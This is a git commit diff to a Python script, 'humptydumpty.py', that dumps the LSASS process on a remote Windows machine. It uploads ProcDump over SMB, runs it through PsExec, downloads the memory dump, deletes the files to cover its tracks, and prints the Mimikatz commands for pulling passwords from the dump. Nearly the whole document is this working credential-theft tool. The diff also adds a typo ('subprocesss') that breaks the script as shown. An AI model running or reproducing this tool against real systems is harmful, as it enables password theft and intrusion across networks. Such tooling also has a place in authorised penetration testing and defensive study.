a2ab0891abad962e14877607c3536488a73fa8ec
n33dle <37037632+n33dle@users.noreply.github.com>
2019-09-21 09:14:23 +1000

    Update humptydumpty.py

--- humptydumpty.py
+++ humptydumpty.py
@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
-# Author: David Roccasalva (@n33dle0x00) 
-# Description: Dumps LSASS on target machines and download the dumpfiles for some offline mimikatz happyfuntimes
-# Version: 0.1 (WORK IN PROGRESS)
-# Note: This code may suck. Feel free to make it better :)
+# Author: n33dle
+# Description: Dumps LSASS on target machines and downloads the dumpfiles for some offline mimikatz happyfuntimes
+# Version: 1 (WORK IN PROGRESS!)
+# Note: This code may suck. Any feedback/suggestions, let me know!
 
-import subprocess
+import subprocesss
 import argparse
 from termcolor import colored
 from pypsexec.client import Client
@@ -13,36 +13,41 @@ parser = argparse.ArgumentParser()
 parser.add_argument("--target", "-t", help="Set the target", dest="target")
 parser.add_argument("--username", "-u", help="Set the target username", dest="username")
 parser.add_argument("--password", "-p", help="Set the target password", dest="password")
-#parser.add_argument("--domain", "-d", help="Set the target domain", dest="domain")
+#parser.add_argument("--domain", "-d", help="Set the target domain", dest="domain") needs work
 args = parser.parse_args()
 
 #upload procdump
-print (colored("\nUploading procdump", "green"))
+print (colored("\n[-] Sending ProcDump over SMB...", "yellow"))
 subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c put procdump.exe"])
+print (colored("\n[+] Done", "green"))
 
 #Dump creds
-print (colored("\nDump LSASS over PsExec", "green"))
+print (colored("\n[-] Dumping Lsass.exe to file...", "yellow"))
 c = Client(args.target, username=args.username, password=args.password, encrypt=False)
 c.connect()
 try:
  c.create_service()
- c.run_executable("cmd.exe","/c c:\procdump.exe -accepteula -64 -ma lsass.exe c:\hello.dmp")
+ c.run_executable("cmd.exe","/c c:\procdump.exe -accepteula -64 -ma lsass.exe c:\humpty-" + args.target + ".dmp")
 finally:
  c.disconnect()
+print (colored("\n[+] Done", "green"))
 
 #Download dump and cleanup
-print (colored("\nDownload LSASS Dump", "green"))
-subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c get hello.dmp;del hello.dmp;del procdump.exe"])
+print (colored("\n[-] Downloading the Lsass dumpfile and cleaning up...", "yellow"))
+#subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c get hello.dmp;del hello.dmp;del procdump.exe"]) old
+subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c get humpty-"+args.target+".dmp;del humpty-"+args.target+".dmp;del procdump.exe"])
+print (colored("\n[+] Done", "green"))
 
-print (colored("\nDone! Now dump those creds\nRun the following:", "green"))
+print (colored("\n[+] Complete! Now dump those creds\nRun the following:", "green"))
 print (colored("Mimikatz# sekurlsa::Minidump hello.dmp", "blue"))
 print (colored("Mimikatz# sekurlsa::logonPasswords full", "blue"))
 	
 '''
 To do:
-- Set default as local auth, override with domain auth
+- Set default as local auth and override with domain auth when -d selected
+- FFS! Fix passwords/usernames with non-alpha chars.
 - Allow target to be single IP or list of IPs from a file
 - Better error handling
-- Add arg for download locaiton (set default as home drive?)
-- Set dump files as <hostname>.dmp for better organising
+- Add arg for download locaiton (and set default as home drive?)
+- Automate mimikatz at the end, or prompt to run mimikatz or end script
 '''
